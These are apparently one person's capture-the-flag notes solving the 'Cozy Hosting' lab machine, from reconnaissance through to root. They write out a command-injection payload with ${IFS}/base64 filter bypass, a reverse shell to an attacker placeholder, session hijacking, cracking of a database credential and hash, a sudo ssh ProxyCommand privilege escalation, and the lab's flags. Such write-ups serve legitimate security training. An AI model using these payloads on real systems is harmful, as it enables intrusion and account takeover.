# Cozy Hosting

> IP: [10.10.11.230]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.230 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://cozyhosting.htb
         2. Need to add this to our /etc/hosts file
3. HTTP
   1. Navigate to website and inspect source code
   2. LOGIN PAGE
      1. UN: admin
      2. PW: password
      3. In the url we see /login?error
   3. XSS
      1. Test the login form for xss
         1. PAYLOAD: <script>alert(1);</script>
         2. Nothing
   4. COOKIE
      1. We also see a JSESSION cookie and a value
         1. Couldn't crack this
   5. GOBUSTER
      1. > gobuster dir -x php,txt,html -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. index
         2. login
         3. admin
         4. logout
         5. error
   6. DIRSEARCH
      1. > dirsearch -u cozyhosting.htb
         1. /actuator

            ```json
                {"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}
            ```

         2. /actuator/env
         3. /actuator/health
         4. /actuator/sessions

            ```json
                {
                    "57C683F9031DDF4AE4065F40FCE64B2B":"UNAUTHORIZED",
                    "103649C33456367C6B155F698492F80C":"UNAUTHORIZED",
                    "A6D2D52E081B6F28DE8609C145EA8019":"UNAUTHORIZED",
                    "CC19EC16BD5CD02F1EA22D5638FAF803":"UNAUTHORIZED",
                    "F670F6CD1522D7887CF8BCE9DFB3749C":"kanderson",
                    "F26F459B923D1C512526E9B6B4F97C30":"UNAUTHORIZED",
                    "DF4AE9608E4C2C93725F68EAC4F7D5E1":"UNAUTHORIZED"}
            ```

            1. Maybe these sessions refer to PHP Sessions like interms of our cookie
4. BURPSUITE
   1. Proxy -> Intercept -> "Cookie: JSESSIONID=F670F6CD1522D7887CF8BCE9DFB3749C"
   2. Success! We are now logged into the admin dashboard
      1. In here we see a HOSTNAME & USERNAME input field
   3. ADMIN DASHBOARD
      1. HOSTNAME: 127.0.0.1
      2. USERNMAE: (I testetd several different names, but if I left it blank we got this response)
         1. REQUEST: We can see the request being sent is to /executessh
         2. RESPONSE:

        ```text
            usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
        ```

        1. So it looks like it is running ssh commands
   4. TRIAL AND ERROR
      1. For the hostname lets try and use our attack machine to see if it pings back to us
         1. HOSTNAME: MY_IP_ADDR
            1. INVALID-HOSTNAME
      2. For the hostname lets try the victim machine IP address
         1. HOSTNAME: 10.10.11.230
         2. USERNAME: [COMMAND-HERE]
            1. Commands tested:
               1. test; `whoami`
                  1. RSEPONSE: "error=Username%20can%27t%20contain%20whitespaces!"
                  2. So can't have whitespaces
               2. test;`whoami`
                  1. RESPONSE: "ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: app@10.10.11.230: command not found"
                  2. So we see that there was a problem, BUT we did see our user with the chunk that says "app@10.10.11.230"

## HELP NEEDED CREDIT @Aniket Das for his help / writeup hints

1. So I was definitely on the right track, however we needed to go a step further by base64 encoding our payload and using "${IFS}" for whitespace
2. BASE64 TEST
   1. > echo "whoami" | base64
      1. RESPONSE: d2hvYW1pCg==
3. PAYLOAD
   1. HOST: 10.10.11.230
   2. USER: test;`d2hvYW1pCg==`
      1. Did not work
4. PAYLAOD 2.0
   1. HOST: 10.10.11.230
   2. USER: `echo${IFS}d2hvYW1pCg==|base64${IFS}-d|bash`


## STEPS CONTINUED

1. Now that we have the general idea from the hint, lets try and use this to get a revshell
2. REVSHELL BUILD
   1. Convert to base64 -> bash -i >& /dev/tcp/MY_IP_ADDR/7777 0>&1
      1. BASE64: YmFzaCAtaSA+JiAvZGV2L3RjcC9NWV9JUF9BRERSLzc3NzcgMD4mMQo=
   2. Full command
      1. > `echo YmFzaCAtaSA+JiAvZGV2L3RjcC9NWV9JUF9BRERSLzc3NzcgMD4mMQo=| base64 -d | bash`
   3. Fix whitespaces
      1. > `echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC9NWV9JUF9BRERSLzc3NzcgMD4mMQo=|base64${IFS}-d|bash`
   4. Full Command
      1. > test;`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC9NWV9JUF9BRERSLzc3NzcgMD4mMQo=|base64${IFS}-d|bash`
      2. SUCCESS!!!
      3. Stabilize shell
3. ENUMERATION
   1. Check user home directories
      1. > ls /home
         1. josh
      2. > ls /home/josh
         1. PERMISSION DENIED
   2. Go back to /app directory we started in
      1. Look through files
         1. > ls
            1. cloudhosting-0.0.1.jar
      2. Lets open this java file and see if there is anything important in it
         1. > jar xf cloudhosting-0.0.1.jar
            1. jar not installed on victim machine
            2. So lets download this to our machine
               1. > wget http://10.10.11.230:9999/cloudhosting-0.0.1.jar
         2. Now we can extract the files 
            1. > jar xf cloudhosting-0.0.1.jar
      3. Explore
         1. Under BOOT-INF -> Classes -> application.properties
            1. In here we see a username and password to a postgres database

               ```text
                  spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
                  spring.datasource.username=postgres
                  spring.datasource.password=Vg&nvzAQ7XxR
               ```

               1. UN: postgres
               2. PW: Vg&nvzAQ7XxR
               3. So back on the victim machine lets login to the localhost postgres
   3. POSTGRES
      1. > psql -h 127.0.0.1 -p 5432 -U postgres
      2. > \l

         ```postgres
               Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
            -------------+----------+----------+-------------+-------------+-----------------------
            cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
            postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
            template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                        |          |          |             |             | postgres=CTc/postgres
            template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
                        |          |          |             |             | postgres=CTc/postgres
         ```

         1. Lets select the cozyhosting database
      3. > \c cozyhosting
      4. > \dt

         ```postgres
                     List of relations
            Schema | Name  | Type  |  Owner   
            --------+-------+-------+----------
            public | hosts | table | postgres
            public | users | table | postgres
         ```

         1. We want to select the users table
      5. > SELECT * FROM users;

         ```postgres
               name    |                           password                           | role  
            -----------+--------------------------------------------------------------+-------
            kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
            admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
         ```

         1. Bingo! We now have a list of usernames and their hashed passwords, lets try and crack them
4. CRACK THE HASH
   1. Looking at the hashcat table we see the "$2a" looks like it is a bcrypt hash
   2. HASHCAT
      1. > hashcat -m 3200 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /opt/rockyou.txt
         1. RESPONSE: `$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited`
            1. Lets try using this as our login
5. SSH
   1. ssh josh@cozyhosting.htb
      1. PW: manchesterunited
      2. SUCCESS
6. ENUMERATION PT.2
   1. Get user flag
      1. > cat /home/josh/user.txt
         1. FLAG: `3b089f54aed32a6cbc9c690e3b2ba6e3`
   2. Check for sudo privileges (if any)
      1. > sudo -l

         ```text
            Matching Defaults entries for josh on localhost:
               env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

            User josh may run the following commands on localhost:
               (root) /usr/bin/ssh *
         ```

         1. So this looks like we can run the ssh command as root
   3. GTFOBins
      1. SSH
         1. We see under the sudo section there is a way to escalate privliges
            1. > sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
7. EXPLOIT
   1. Run our command
      1. > sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
      2. SUCCESS
   2. Get root flag
      1. > cat /root/root.txt
         1. FLAG: `18fa5e93650008dd5225e3d73cbb0d56`

## QUESTIONS

1. User flag
   1. `3b089f54aed32a6cbc9c690e3b2ba6e3`
2. Root flag
   1. `18fa5e93650008dd5225e3d73cbb0d56`
